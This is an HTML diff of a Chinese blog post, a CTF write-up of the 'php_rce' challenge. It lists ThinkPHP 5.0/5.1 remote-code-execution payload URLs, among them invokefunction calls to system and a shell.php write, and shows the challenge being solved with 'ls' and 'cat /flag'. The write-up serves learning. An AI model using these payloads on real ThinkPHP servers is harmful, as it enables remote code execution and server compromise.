@@ -6,16 +6,19 @@
   
   <title>php_rce | 梧子千年的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="攻防世界 php_rcehello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog这篇">
+  <meta name="description" content="攻防世界 php_rcehello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog这篇blog主要记录的是关于php_rce的一道题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php_rce">
 <meta property="og:url" content="https://wuziqiannian.github.io/2023/07/10/php-rce/index.html">
 <meta property="og:site_name" content="梧子千年的博客">
-<meta property="og:description" content="攻防世界 php_rcehello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog这篇">
+<meta property="og:description" content="攻防世界 php_rcehello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog这篇blog主要记录的是关于php_rce的一道题">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2023/07/10/embwIBGL3x8YHhQ.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/10/38za15lMfk9SdFe.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/10/j5EtBKFqiONs8yk.png">
+<meta property="og:image" content="https://s2.loli.net/2023/07/10/JmQqYyeLjwgcXNt.png">
 <meta property="article:published_time" content="2023-07-10T02:16:09.000Z">
-<meta property="article:modified_time" content="2023-07-10T03:08:42.017Z">
+<meta property="article:modified_time" content="2023-07-10T09:15:17.593Z">
 <meta property="article:author" content="梧子千年">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s2.loli.net/2023/07/10/embwIBGL3x8YHhQ.png">
@@ -101,7 +104,14 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="攻防世界-php-rce"><a href="#攻防世界-php-rce" class="headerlink" title="攻防世界 php_rce"></a>攻防世界 php_rce</h1><p>hello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog<br>这篇<br><img src="https://s2.loli.net/2023/07/10/embwIBGL3x8YHhQ.png" alt="屏幕截图 2023-07-10 102205.png"></p>
+        <h1 id="攻防世界-php-rce"><a href="#攻防世界-php-rce" class="headerlink" title="攻防世界 php_rce"></a>攻防世界 php_rce</h1><p>hello 大家，好久没写过blog了，也好久没做过题了，假期开始，便回来做题，更新假期ctf学习的第一篇blog<br>这篇blog主要记录的是关于php_rce的一道题<br> <span id="more"></span><br>打开题目环境:<br><img src="https://s2.loli.net/2023/07/10/embwIBGL3x8YHhQ.png" alt="屏幕截图 2023-07-10 102205.png"><br>所给予的提示只有thinkphp v5<br>考虑到是一个框架，且为rce，也就是说一定有相关可以利用的漏洞，在google搜索一下，相关payload如下:<br><strong>5.0x</strong><br><code>?s=index/think\config/get&amp;name=database.username</code> <em># 获取配置</em>信息<br><code>?s=index/\think\Lang/load&amp;file=../../test.jpg</code>  <em># 包含任意文件</em><br><code>?s=index/\think\Config/load&amp;file=../../t.php</code>   <em># 包含任意.php文件</em><br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><em># 可用于执行命令</em>  </p>
+<p><strong>5.1x</strong>  <em>#本题未用到</em><br><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd</code><br><code>?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt; </code><br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; </code><br><code>?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
+<p><strong>payload用法示例</strong><br><code>index.php?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
+<p><strong>进行解题：</strong><br>（1）根据5.0版本与rce进行命令执行：<br>payload：url&#x2F;<code>index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br>result：<br><img src="https://s2.loli.net/2023/07/10/38za15lMfk9SdFe.png" alt="屏幕截图 2023-07-10 101246.png"></p>
+<p>（2）似乎什么都没有，于是我们访问一下根目录：<br>payload：url&#x2F;<code>index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br>result:<br><img src="https://s2.loli.net/2023/07/10/j5EtBKFqiONs8yk.png" alt="屏幕截图 2023-07-10 101259.png"></p>
+<p>(3) 我们看到了很想要的东西 <strong>flag</strong>，使用cat打开<br>payload：url&#x2F;<code>index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code><br>result:<br><img src="https://s2.loli.net/2023/07/10/JmQqYyeLjwgcXNt.png" alt="屏幕截图 2023-07-10 101327.png">  </p>
+<p>拿到flag：flag{thinkphp5_rce}  </p>
+<p><strong>一些其他的东西</strong><br>1.不是特别清楚为什么flag会显示两遍<br>2.漏洞解析博客：<a target="_blank" rel="noopener" href="https://syst1m.com/post/thinkphp5-rce/">https://syst1m.com/post/thinkphp5-rce/</a></p>
 
       
     </div>
